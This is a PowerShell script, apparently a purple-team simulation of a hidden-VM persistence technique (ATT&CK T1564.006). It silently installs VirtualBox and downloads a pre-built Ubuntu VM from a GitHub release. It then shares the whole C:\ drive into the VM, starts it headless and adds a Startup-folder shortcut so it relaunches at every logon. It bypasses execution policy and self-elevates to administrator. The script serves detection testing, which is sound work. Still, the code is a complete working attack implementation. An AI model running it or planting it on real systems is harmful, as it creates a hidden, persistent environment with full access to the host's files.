<#
.SYNOPSIS
    Simulates a VM persistence technique by automating the setup of a VirtualBox VM with a pre-configured Ubuntu image, mounting a shared folder, and starting the VM in headless mode.
    technique: T1564.006
    tactics: TA0003 - TA0005
    ref: https://x.com/mthcht/status/1868300036570018273

.DESCRIPTION
    This script is designed to streamline the deployment of a pre-configured Ubuntu VirtualBox virtual machine (VM). It performs the following steps:
    
    1. **VirtualBox Installation:**
        - Downloads the VirtualBox installer from the provided URL.
        - Installs VirtualBox silently without user intervention.
        - Verifies that the installation was successful and adds VirtualBox to the system PATH for easier command execution.

    2. **Download and Extract VM:**
        - Downloads a compressed archive containing a pre-configured Ubuntu VM from the provided URL.
        - Extracts the VM files to a specified temporary directory and verifies the extraction.

    3. **Register the VM:**
        - Locates the `.vdi` file for the VM.
        - Registers the VM with VirtualBox using the provided VM name.
        - Configures the VM with resources (e.g., memory, CPUs) and connects the `.vdi` file to the VM.

    4. **Shared Folder Setup:**
        - Adds a shared folder between the host and the VM (the entire C:\)
        - Ensures the shared folder is configured to automatically mount when the VM starts.
        - Skips this step if the shared folder already exists.

    5. **Start the VM:**
        - Starts the VM in headless mode (without opening a GUI).
        - Verifies that the VM starts successfully and logs any errors.

    6. **Startup Configuration:**
        - Creates a shortcut in the Windows Startup folder to ensure the VM starts in headless mode at system logon.

    Additional:
    - Checks if the script is running with administrator privileges and prompts for elevation if necessary.
    - Verifies the state of the VM and skips redundant or conflicting operations (e.g., re-registering an already registered VM).
    - Logs all operations and errors to a transcript file for auditing and troubleshooting.

.PARAMETER virtualBoxInstallerURL
    URL to download the VirtualBox installer.

.PARAMETER vmDownloadURL
    URL to download the pre-configured VM archive.

.EXAMPLE
    powershell.exe -NoProfile -ep Bypass -File .\VM_Persistence_simulation_VirtualBox.ps1 -WindowStyle Hidden
    Executes the script to download, install, and configure a VirtualBox VM with a shared folder and headless startup.

.NOTES
    Author: @mthcht
    Version: 1.0
    Date: 2024-12-15
#>


[CmdletBinding()]
param()

# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "This script requires administrator privileges. Relaunching with elevated privileges..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

# Configuration Variables
$virtualBoxInstallerURL = "https://download.virtualbox.org/virtualbox/7.0.10/VirtualBox-7.0.10-158379-Win.exe"
$virtualBoxInstallerPath = "$env:TEMP\VirtualBoxInstaller.exe"
$vmDownloadURL = "https://github.com/mthcht/Purpleteam/releases/download/vm/ubuntux64.zip"
$vmZipPath = "$env:TEMP\ubuntux64.zip"
$vmExtractPath = "$env:TEMP\UbuntuVM"
$vmName = "UbuntuVM"
$sharedFolderName = "SharedHost"
$sharedFolderPath = "C:\" 
$transcriptPath = "$env:TEMP\VirtualBoxVM_Setup.log"
$ProgressPreference = 'SilentlyContinue'

# Start Transcript Logging
Start-Transcript -Path $transcriptPath -Append -Force

# Helper Function to Verify Step Success
function Verify-Success {
    param (
        [Parameter(Mandatory = $true)][bool]$Condition,
        [string]$SuccessMessage,
        [string]$ErrorMessage,
        [bool]$IsRequired
    )

    if ($Condition -eq $true) {
        Write-Verbose $SuccessMessage
        Write-Output $SuccessMessage
    } else {
        Write-Error $ErrorMessage
        Write-Output $ErrorMessage
        if ($IsRequired) {
            Write-Error "Required step failed. Exiting script."
            Stop-Transcript
            exit 1
        }
    }
}

try {
    # Step 1: Download and Install VirtualBox
    Write-Verbose "Downloading VirtualBox installer..."
    Invoke-WebRequest -Uri $virtualBoxInstallerURL -OutFile $virtualBoxInstallerPath
    Verify-Success ([bool](Test-Path $virtualBoxInstallerPath)) `
        "VirtualBox installer downloaded successfully." `
        "Failed to download VirtualBox installer." `
        $true

    Write-Verbose "Installing VirtualBox silently..."
    $installProcess = Start-Process -FilePath $virtualBoxInstallerPath -ArgumentList "/silent" -NoNewWindow -PassThru
    $installProcess.WaitForExit()
    Verify-Success ([bool](Test-Path "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe")) `
        "VirtualBox installed successfully." `
        "VirtualBox installation failed." `
        $true

    # Step 2: Add VirtualBox to PATH
    Write-Verbose "Adding VirtualBox to PATH..."
    $virtualBoxPath = "C:\Program Files\Oracle\VirtualBox"
    $env:Path += ";$virtualBoxPath"
    Verify-Success ($env:Path -like "*VirtualBox*") `
        "VirtualBox added to PATH." `
        "Failed to add VirtualBox to PATH. Continuing..." `
        $false

    # Step 3: Download and Extract VM
    Write-Verbose "Downloading VM archive..."
    Invoke-WebRequest -Uri $vmDownloadURL -OutFile $vmZipPath
    Verify-Success ([bool](Test-Path $vmZipPath)) `
        "VM archive downloaded successfully." `
        "Failed to download VM archive." `
        $true

    Write-Verbose "Extracting VM files..."
    Expand-Archive -Path $vmZipPath -DestinationPath $vmExtractPath -Force
    Verify-Success ([bool](Test-Path $vmExtractPath)) `
        "VM archive extracted successfully." `
        "Failed to extract VM archive." `
        $true

    # Step 4: Locate VDI File
    Write-Verbose "Locating VDI file..."
    $vdiFilePath = Get-ChildItem -Path $vmExtractPath -Recurse -Filter "*.vdi" | Select-Object -First 1 | ForEach-Object { $_.FullName }
    Verify-Success (-not [string]::IsNullOrEmpty($vdiFilePath)) `
        "VDI file located: $vdiFilePath" `
        "No VDI file found in the extracted archive." `
        $true

    # Step 5: Register VM
    Write-Verbose "Checking if the VM already exists..."
    $vmState = & VBoxManage showvminfo $vmName --machinereadable | Select-String -Pattern "VMState=" | ForEach-Object { $_.ToString().Split('=')[1].Trim('"') }
    if (-not $vmState) {
        Write-Verbose "Registering the VM in VirtualBox..."
        & VBoxManage createvm --name $vmName --register
        & VBoxManage modifyvm $vmName --memory 2048 --cpus 2 --nic1 nat --boot1 disk
        & VBoxManage storagectl $vmName --name "SATA Controller" --add sata --controller IntelAhci
        & VBoxManage storageattach $vmName --storagectl "SATA Controller" --port 0 --device 0 --type hdd --medium $vdiFilePath
        Verify-Success ([bool]$?) `
            "VM registered and configured successfully." `
            "Failed to register or configure the VM." `
            $true
    } else {
        Write-Output "VM '$vmName' already exists. Skipping registration."
    }

    # Step 6: Add Shared Folder
    if ($vmState -ne "running" -and $vmState -ne "locked") {
        Write-Verbose "Checking if shared folder already exists..."
        $sharedFolderList = & VBoxManage showvminfo $vmName | Select-String -Pattern "Name: $sharedFolderName"
        if ($sharedFolderList) {
            Write-Output "Shared folder '$sharedFolderName' already exists. Skipping."
        } else {
            & VBoxManage sharedfolder add $vmName --name $sharedFolderName --hostpath $sharedFolderPath --automount
            Verify-Success ([bool]$?) `
                "Shared folder '$sharedFolderName' added successfully." `
                "Failed to add shared folder." `
                $false
        }
    } else {
        Write-Output "Shared folder operation skipped as VM is in '$vmState' state."
    }

    # Step 7: Start the VM
    if ($vmState -eq "running") {
        Write-Output "VM '$vmName' is already running. Skipping start operation."
    } elseif ($vmState -eq "locked") {
        Write-Output "VM '$vmName' is locked. Skipping start operation."
    } else {
        & VBoxManage startvm $vmName --type headless
        Verify-Success ([bool]$?) `
            "VM started successfully in headless mode." `
            "Failed to start the VM." `
            $true
    }

    # Step 8: Configure VM to Start at Logon via Startup Folder
    Write-Verbose "Configuring the VM to start at logon via the Startup folder..."
    $startupFolder = [System.Environment]::GetFolderPath("Startup")
    $shortcutPath = Join-Path $startupFolder "StartUbuntuVM.lnk"

    try {
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"
        $shortcut.Arguments = "startvm $vmName --type headless"
        $shortcut.WorkingDirectory = "C:\Program Files\Oracle\VirtualBox"
        $shortcut.Save()
        Verify-Success ([bool](Test-Path $shortcutPath)) `
            "Shortcut created successfully in the Startup folder." `
            "Failed to create the shortcut in the Startup folder." `
            $true
    }
    catch {
        Write-Error "An error occurred while creating the shortcut: $_"
    }
}
catch {
    Write-Error "An unexpected error occurred: $_"
}
finally {
    Write-Verbose "Script execution complete."
    Stop-Transcript
}
